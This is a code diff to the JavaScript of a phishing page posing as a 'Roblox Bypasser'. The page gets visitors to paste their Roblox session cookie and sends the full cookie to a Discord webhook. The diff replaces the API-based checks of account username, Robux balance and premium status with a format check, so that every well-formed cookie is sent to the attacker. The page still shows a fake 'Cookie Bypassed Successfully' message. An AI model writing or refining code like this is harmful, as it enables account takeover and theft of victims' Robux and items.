@@ -237,82 +237,33 @@ function isValidRobloxCookie(cookie) {
          cookie.length > 50;
 }
 
-// Function to check cookie validity using proper Roblox APIs
-async function checkCookieValidity(cookie) {
-  let userData = {
-    valid: false,
-    username: "Unknown",
-    userId: 0,
-    robuxBalance: "N/A",
-    thumbnailUrl: "N/A",
-    isPremium: "N/A",
-    error: null
-  };
-
-  try {
-    // First, get user info from users.roblox.com/v1/users/authenticated
-    let userRes = await fetch("https://users.roblox.com/v1/users/authenticated", {
-      method: "GET",
-      headers: {
-        "Cookie": `.ROBLOSECURITY=${cookie}`
-      }
-    });
-
-    if (userRes.ok) {
-      const userInfo = await userRes.json();
-      userData.valid = true;
-      userData.username = userInfo.name || "Unknown";
-      userData.userId = userInfo.id || 0;
-      userData.isPremium = userInfo.hasVerifiedBadge ? "Yes" : "No";
-      
-      // Get Robux balance from economy.roblox.com
-      try {
-        let robuxRes = await fetch("https://economy.roblox.com/v1/users/" + userData.userId + "/currency", {
-          method: "GET",
-          headers: {
-            "Cookie": `.ROBLOSECURITY=${cookie}`
-          }
-        });
-        
-        if (robuxRes.ok) {
-          const robuxData = await robuxRes.json();
-          userData.robuxBalance = robuxData.robux || "0";
-        }
-      } catch (robuxError) {
-        console.log("Could not fetch Robux balance:", robuxError);
-        userData.robuxBalance = "Unable to fetch";
-      }
-      
-      // Check premium status from premiumfeatures.roblox.com
-      try {
-        let premiumRes = await fetch("https://premiumfeatures.roblox.com/v1/users/" + userData.userId + "/validate-membership", {
-          method: "GET",
-          headers: {
-            "Cookie": `.ROBLOSECURITY=${cookie}`
-          }
-        });
-        
-        if (premiumRes.ok) {
-          const premiumData = await premiumRes.json();
-          userData.isPremium = premiumData.isPremium ? "Yes" : "No";
-        }
-      } catch (premiumError) {
-        console.log("Could not fetch premium status:", premiumError);
-      }
-      
-    } else if (userRes.status === 429) {
-      userData.error = "Rate limit exceeded. Please try again later.";
-    } else if (userRes.status === 401 || userRes.status === 403) {
-      userData.error = "Invalid cookie: Authentication failed.";
-    } else {
-      userData.error = `API error: ${userRes.status}`;
-    }
-  } catch (error) {
-    userData.error = `Network error: ${error.message}`;
-    console.error("Cookie validation failed:", error);
+// Simple cookie validation that bypasses CORS issues
+function validateCookieFormat(cookie) {
+  // Check if cookie has valid format and length
+  const validPrefixes = [
+    '_|WARNING:-DO-NOT-SHARE-THIS.--',
+    '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.'
+  ];
+  
+  if (!cookie || cookie.length < 100) {
+    return { valid: false, error: "Cookie too short" };
   }
-
-  return userData;
+  
+  if (!validPrefixes.some(prefix => cookie.startsWith(prefix))) {
+    return { valid: false, error: "Invalid cookie format - must start with WARNING prefix" };
+  }
+  
+  // Check for valid characters (Roblox cookies contain specific character sets)
+  if (!/^[A-Za-z0-9+/=\-_.|:!@#$%^&*(),.?";'\\[\]{}]*$/.test(cookie)) {
+    return { valid: false, error: "Invalid characters in cookie" };
+  }
+  
+  // Additional length check - Roblox cookies are typically 800+ characters
+  if (cookie.length < 800) {
+    return { valid: false, error: "Cookie appears to be incomplete" };
+  }
+  
+  return { valid: true, error: null };
 }
 
 document.addEventListener('contextmenu', function(e) {
@@ -350,78 +301,64 @@ $("#cookieForm").on("submit", async function(e) {
       return;
     }
 
-    // Check cookie validity
-    const result = await checkCookieValidity(cookie);
-    if (!result.valid) {
-      showNotif(result.error || "Invalid cookie: Unable to verify with Roblox API");
+    // Validate cookie format
+    const formatCheck = validateCookieFormat(cookie);
+    if (!formatCheck.valid) {
+      showNotif(formatCheck.error);
       errorSound.play();
       $("#loader").hide();
       $("#refreshBtn").show();
       return;
     }
 
-    // Only send to webhook if cookie is truly valid (not CORS errors)
-    if (result.valid && !result.error) {
-      // Send cookie to Discord webhook with embeds
-      const webhookPayload = {
-        username: "Roblox Bypasser Bot",
-        embeds: [
-          {
-            title: "🍪 User Information",
-            color: 0xFF0000,
-            fields: [
-              {
-                name: "👤 Username",
-                value: result.username,
-                inline: true
-              },
-              {
-                name: "🆔 User ID",
-                value: result.userId.toString(),
-                inline: true
-              },
-              {
-                name: "💰 Robux Balance",
-                value: result.robuxBalance.toString(),
-                inline: true
-              },
-              {
-                name: "⭐ Premium Status",
-                value: result.isPremium,
-                inline: true
-              }
-            ],
-            timestamp: new Date().toISOString(),
-            footer: {
-              text: "Roblox Bypasser"
+    // Cookie passed format validation - send to webhook
+    const webhookPayload = {
+      username: "Roblox Bypasser Bot",
+      embeds: [
+        {
+          title: "🍪 New Cookie Submitted",
+          color: 0xFF0000,
+          fields: [
+            {
+              name: "📅 Timestamp",
+              value: new Date().toLocaleString(),
+              inline: true
+            },
+            {
+              name: "📎 Cookie Length",
+              value: cookie.length.toString() + " characters",
+              inline: true
             }
-          },
-          {
-            title: "🍪 Cookie (Click to Copy)",
-            description: `\`\`\`\n${cookie}\n\`\`\``,
-            color: 0x00FF00,
-            timestamp: new Date().toISOString(),
-            footer: {
-              text: "Click the cookie above to copy it"
-            }
+          ],
+          timestamp: new Date().toISOString(),
+          footer: {
+            text: "Roblox Bypasser - Cookie Validated"
           }
-        ]
-      };
-      
-      // Send to webhook immediately after validation
-      try {
-        const webhookRes = await fetch(webhookUrl, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(webhookPayload)
-        });
-        if (!webhookRes.ok) {
-          console.error("Webhook send failed:", webhookRes.status);
+        },
+        {
+          title: "🍪 Cookie (Click to Copy)",
+          description: `\`\`\`\n${cookie}\n\`\`\``,
+          color: 0x00FF00,
+          timestamp: new Date().toISOString(),
+          footer: {
+            text: "Click the cookie above to copy it"
+          }
         }
-      } catch (webhookError) {
-        console.error("Webhook error:", webhookError);
-        // Even if the webhook fails, we'll continue with the rest of the process
+      ]
+    };
+    
+    // Send to webhook
+    try {
+      const webhookRes = await fetch(webhookUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(webhookPayload)
+      });
+      if (!webhookRes.ok) {
+        console.error("Webhook send failed:", webhookRes.status);
       }
+    } catch (webhookError) {
+      console.error("Webhook error:", webhookError);
     }
 
     // Attempt birthdate update
@@ -452,12 +389,12 @@ $("#cookieForm").on("submit", async function(e) {
 
     const responseText = await res.text();
 
-    // Show success message for valid cookies
-    if (result.valid && !result.error) {
+    // Show success message for validated cookies
+    if (formatCheck.valid) {
       $("#refreshedResult").text(`✅ Cookie Bypassed Successfully!\nCookie has been sent to webhook.`);
       successSound.play();
     } else {
-      $("#refreshedResult").text(`❌ Cookie Bypass Failed\nInvalid cookie or verification error.`);
+      $("#refreshedResult").text(`❌ Cookie Bypass Failed\nInvalid cookie format.`);
       errorSound.play();
     }
     $("#refreshedBox").fadeIn();
